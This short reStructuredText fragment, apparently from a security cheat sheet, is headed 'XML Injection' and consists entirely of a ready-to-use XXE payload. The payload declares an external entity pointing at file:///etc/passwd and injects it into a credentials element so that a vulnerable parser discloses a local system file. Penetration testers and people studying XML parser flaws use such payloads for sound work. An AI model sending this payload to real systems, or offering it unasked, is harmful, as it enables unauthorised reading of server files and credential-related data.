XML Injection
*****************

.. code-block:: console

        <?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
        <creds>
                <user>&xxe;</user>
                <pass>mypass</pass>
        </creds>

